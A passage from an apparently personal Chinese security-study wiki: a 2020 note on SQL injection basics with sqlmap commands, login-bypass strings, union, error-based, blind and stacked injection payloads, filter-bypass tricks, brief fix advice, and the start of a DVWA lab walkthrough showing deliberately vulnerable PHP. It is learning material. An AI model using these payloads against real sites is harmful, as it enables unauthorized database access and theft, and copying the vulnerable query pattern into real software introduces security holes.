+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/%E4%BD%BF%E7%94%A8%E6%89%8B%E6%9C%BA%E6%89%A9%E5%B1%95%E7%94%B5%E8%84%91%E5%B1%8F%E5%B9%95/">使用手机扩展电脑屏幕</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/%E4%BD%BF%E7%94%A8%E7%94%B5%E8%84%91%E6%8E%A7%E5%88%B6%E6%89%8B%E6%9C%BA/">使用电脑控制手机</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            树莓派
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A01--%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F/">让树莓派有点事做01--安装系统</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A02--%E7%A7%81%E6%9C%89%E4%BA%91%E6%9C%8D%E5%8A%A1/">让树莓派有点事做02--私有云服务</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A03--%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/">让树莓派有点事做03--外网访问</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A04--git%E6%9C%8D%E5%8A%A1%E5%99%A8/">让树莓派有点事做04--git服务器</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A05--%E4%B8%8B%E8%BD%BD%E6%9C%BA/">让树莓派有点事做05--下载机</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            渗透笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            常见服务
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            139-samba
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/139-samba/samba%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/">Samba服务搭建与配置</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            80-http
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/80-http/nginx%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/">Nginx搭建Web服务器</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3&%E6%BC%8F%E6%B4%9E/">常见端口号&漏洞</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            靶机笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            vulnhub
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/">【Vulnhub】Me And My Girlfriend--Workthourgh</a></li>  <li class="file"><a href="/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/6-nightfall/">【Vulnhub】Sunset:nightfall--Workthourgh：未完成</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/index/">Index</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-学习笔记/Web安全学习笔记/SQLi/sqli基础" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Web安全学习笔记</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/">SQLi</a>
+    </div>
+
+                        
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/">
+            <time datetime="2020-06-13T02:57:19.000Z" itemprop="datePublished">2020-06-13</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            sql注入基础学习
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入基础学习"><span class="toc-number">1.</span> <span class="toc-text">sql注入基础学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入定义-amp-原理"><span class="toc-number">1.1.</span> <span class="toc-text">sql注入定义&amp;原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL基础"><span class="toc-number">1.2.</span> <span class="toc-text">MySQL基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入渗透流程"><span class="toc-number">1.3.</span> <span class="toc-text">sql注入渗透流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入类型-amp-探测"><span class="toc-number">1.4.</span> <span class="toc-text">sql注入类型&amp;探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过"><span class="toc-number">1.5.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复建议"><span class="toc-number">1.6.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DVWA-SQLi"><span class="toc-number">1.7.</span> <span class="toc-text">DVWA SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection：Low"><span class="toc-number">1.7.1.</span> <span class="toc-text">SQL Injection：Low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection：Medium"><span class="toc-number">1.7.2.</span> <span class="toc-text">SQL Injection：Medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection：High"><span class="toc-number">1.7.3.</span> <span class="toc-text">SQL Injection：High</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection：Impossible"><span class="toc-number">1.7.4.</span> <span class="toc-text">SQL Injection：Impossible</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Blind：Low"><span class="toc-number">1.7.5.</span> <span class="toc-text">SQL Injection Blind：Low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Blind：Medium"><span class="toc-number">1.7.6.</span> <span class="toc-text">SQL Injection Blind：Medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Blind：High"><span class="toc-number">1.7.7.</span> <span class="toc-text">SQL Injection Blind：High</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection-Blind：Impossible"><span class="toc-number">1.7.8.</span> <span class="toc-text">SQL Injection Blind：Impossible</span></a></li></ol></li></ol></li></ol>
+                </div>
+            
+        
+        
+            <h2 id="sql注入基础学习"><a href="#sql注入基础学习" class="headerlink" title="sql注入基础学习"></a>sql注入基础学习</h2><h3 id="sql注入定义-amp-原理"><a href="#sql注入定义-amp-原理" class="headerlink" title="sql注入定义&amp;原理"></a>sql注入定义&amp;原理</h3><p>Web应用程序对用户输入的合法性没有判断，参数可控，并带入数据库查询，导致攻击者可以通过构造不同的SQL语句来实现对数据库的操作</p>
+<p>任何提交给服务器的数据都可能会被传送给数据库函数，并且可能得到不安全的处理</p>
+<h3 id="MySQL基础"><a href="#MySQL基础" class="headerlink" title="MySQL基础"></a>MySQL基础</h3><p>Mysql在version 5以后，便多了一个基础库information_schema，存储的的是mysql的结构信息。除此以外，Mysql还拥有一个只有root权限才能访问的mysql库。</p>
+<p>常用查询语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*查库*/</span></span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="comment">/*查表*/</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"库名"</span>;</span><br><span class="line"><span class="comment">/*查列*/</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"表名"</span>;</span><br><span class="line"><span class="comment">/*查数据*/</span></span><br><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">from</span> <span class="string">'库名.表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap工具使用语句：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [url] --dbs  <span class="comment"># 列出数据库</span></span><br><span class="line">sqlmap -u [url] -D [db_name] --tables <span class="comment"># 列出某库中的表名</span></span><br><span class="line">sqlmap -u [url] -D [db_name] -T [table_name] --columns <span class="comment"># 列出列名</span></span><br><span class="line">sqlmap -u [url] -D [db_name] -T [table_name] -C [colunms_name] --dump <span class="comment"># 列出数据</span></span><br><span class="line">其他几个参数</span><br><span class="line">-m filename 		<span class="comment"># 可将获取的信息保存到文件</span></span><br><span class="line">--method POST 		<span class="comment"># 使用POST提交</span></span><br><span class="line">--data <span class="string">"id=1&amp;ip=2"</span> 	<span class="comment"># 提交的数据</span></span><br><span class="line">-P id				<span class="comment"># 指定测试的参数</span></span><br><span class="line">--cookie			<span class="comment"># 指定cookie</span></span><br><span class="line">--sql-query=SQL语句  <span class="comment"># 执行sql语句</span></span><br><span class="line">--sql-shell			<span class="comment"># 获得可交互的shell</span></span><br><span class="line">--sql-file=sql_file	<span class="comment"># 执行文件中的sql语句</span></span><br></pre></td></tr></table></figure>
+
+<p>MySQL中 的注释：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#		Hash语法</span></span><br><span class="line"><span class="comment">/*		C-Style语法</span></span><br><span class="line"><span class="comment">--+		SQL语法</span></span><br><span class="line"><span class="comment">;%00	空字节</span></span><br><span class="line"><span class="comment">`		反引号</span></span><br></pre></td></tr></table></figure>
+
+<p>其中有个特殊情况，例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="comment">/*!50095select user()*/</span>),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>MySQL在注释/**/中间加个感叹号，后面跟上版本号，就可以在当前数据库版本高于或等于该指定版本的时候进行执行里面的sql指令。</p>
+<h3 id="sql注入渗透流程"><a href="#sql注入渗透流程" class="headerlink" title="sql注入渗透流程"></a>sql注入渗透流程</h3><p>信息收集–&gt;数据获取–&gt;提权：</p>
+<p><strong>信息收集</strong></p>
+<ul>
+<li><p>获取注入点回显位置：</p>
+<ul>
+<li>列数：order/group by n–+</li>
+<li>位置：union select 1,2,3,..,n–+</li>
+</ul>
+</li>
+<li><p>数据库类型&amp;版本</p>
+<ul>
+<li>报错信息</li>
+<li>函数：version(),@@version</li>
+</ul>
+</li>
+<li><p>数据库用户</p>
+<ul>
+<li>函数：user() （mysql）</li>
+<li>函数：SYSTEM_USER (SQLServer)</li>
+</ul>
+</li>
+<li><p>数据库权限</p>
+<ul>
+<li>super_priv()</li>
+</ul>
+</li>
+</ul>
+<p><strong>数据获取</strong></p>
+<ul>
+<li>获取库信息</li>
+<li>获取表信息</li>
+<li>获取列信息</li>
+<li>获取数据</li>
+</ul>
+<p><strong>提权</strong></p>
+<ul>
+<li>执行命令</li>
+<li>读文件（中间件&amp;数据库配置文件）</li>
+<li>写文件（写入webshell）</li>
+</ul>
+<h3 id="sql注入类型-amp-探测"><a href="#sql注入类型-amp-探测" class="headerlink" title="sql注入类型&amp;探测"></a>sql注入类型&amp;探测</h3><p><strong>按注入点来分：</strong></p>
+<ol>
+<li><p>数字型：可控参数在sql语句是数字类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">通过如下语句来判断是否存在SQL注入</span><br><span class="line">and 1		True</span><br><span class="line">and 0		False</span><br><span class="line"></span><br><span class="line">and ture	Ture</span><br><span class="line">and false	False</span><br><span class="line"></span><br><span class="line">1-false		return 1 if vulnerable</span><br><span class="line">1-true 		return 0 if vulnerable</span><br><span class="line"></span><br><span class="line">使用运算符来进行判断</span><br><span class="line">1*2			return 2 if vulnerable</span><br><span class="line">1*2			return 1 if not vulnerable</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符型：可控参数在sql语句是字符类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通过如下语句来判断是否存在SQL注入</span><br><span class="line">&#39; 	False</span><br><span class="line">&#39;&#39;	True</span><br><span class="line"></span><br><span class="line">&quot;  	False</span><br><span class="line">&quot;&quot;  True</span><br><span class="line"></span><br><span class="line">\	False</span><br><span class="line">\\	True</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以尽量使用多个引号，可能可以绕过语法检测，例如：</span><br><span class="line">SELECT 1 FROM user_info WHERE 1 &#x3D; &#39;1&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;2&#39;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>登陆型</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*万能密码：*/</span></span><br><span class="line">' OR '1</span><br><span class="line">' OR 1 <span class="comment">--</span></span><br><span class="line">" OR "" = "</span><br><span class="line">" OR 1 = 1 <span class="comment">--</span></span><br><span class="line">'='</span><br><span class="line">'LIKE'</span><br><span class="line">'=0<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<p><strong>按数据提交来分：</strong></p>
+<p>安装注入点的位置来区分的</p>
+<ol>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>Cookie注入</li>
+<li>HTTP头注入</li>
+</ol>
+<p><strong>按执行效果来分：</strong></p>
+<ol>
+<li><p>联合注入：普通情况常用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="keyword">GROUP_CONCAT</span>(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>报错注入：用于存在注入没有回显，但显示报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*XPath语法错误报错*/</span></span><br><span class="line"><span class="keyword">select</span> ExtractValue(<span class="number">1</span>, <span class="keyword">CONCAT</span>(<span class="number">0x5c</span>, (<span class="keyword">SELECT</span> @@<span class="keyword">version</span>)))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*XPath语法错误报错*/</span></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*group by 对rand()函数产生报错*/</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="3">
+<li><p>盲注：用于存在注入但是没有回显，也没有报错的场合</p>
+<ol>
+<li><p>布尔盲注：先判断长度，再判断字符是啥</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*判断长度*/</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*使用left()*/</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">2</span>)=<span class="string">'su'</span></span><br><span class="line">从左边截取前几位，进行比较，返回<span class="number">1</span>则正确，<span class="number">0</span>则错误</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*使用regexp*/</span></span><br><span class="line">待更新</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*使用like*/</span></span><br><span class="line">待更新</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*使用substr()和ascii()*/</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">0x73</span></span><br><span class="line">从左边第<span class="number">1</span>个字符截取<span class="number">1</span>个字符转换成<span class="keyword">ascii</span>码格式然后进行比较</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ord()与mid()*/</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">0x73</span></span><br><span class="line">原理同上</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*在布尔盲注的基础上使用if来判断注入是否成功*/</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">ord</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">0x73</span>),<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="literal">null</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><p>堆叠查询注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*通过；来执行多条sql语句*/</span></span><br><span class="line">1'; <span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>)&gt;<span class="number">115</span>),<span class="keyword">sleep</span>(<span class="number">2</span>),<span class="literal">null</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>二次注入：数据存入数据库时进行了过滤，但取出时过滤不到位导致取出时发生sql注入</p>
+</li>
+<li><p>宽字节注入：数据库编码位GBK时，可用%df’来绕过给单引号加反斜杠的过滤</p>
+<p>因为编码问题，GBK编码可以吃掉ASCII的一个字符</p>
+</li>
+</ol>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul>
+<li>大小写绕过</li>
+<li>双写绕过</li>
+<li>编码绕过：进行两次url编码</li>
+<li>内联注释绕过：<code>/*!*/</code></li>
+</ul>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>过滤危险字符</li>
+<li>使用PDO预编译语句</li>
+</ul>
+<h3 id="DVWA-SQLi"><a href="#DVWA-SQLi" class="headerlink" title="DVWA SQLi"></a>DVWA SQLi</h3><h4 id="SQL-Injection：Low"><a href="#SQL-Injection：Low" class="headerlink" title="SQL Injection：Low"></a>SQL Injection：Low</h4><p><img src="image-20200613190732540.png" alt="image-20200613190732540"></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = mysql_numrows( $result );</span><br><span class="line">    $i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> );</span><br><span class="line">        $last  = mysql_result( $result, $i, 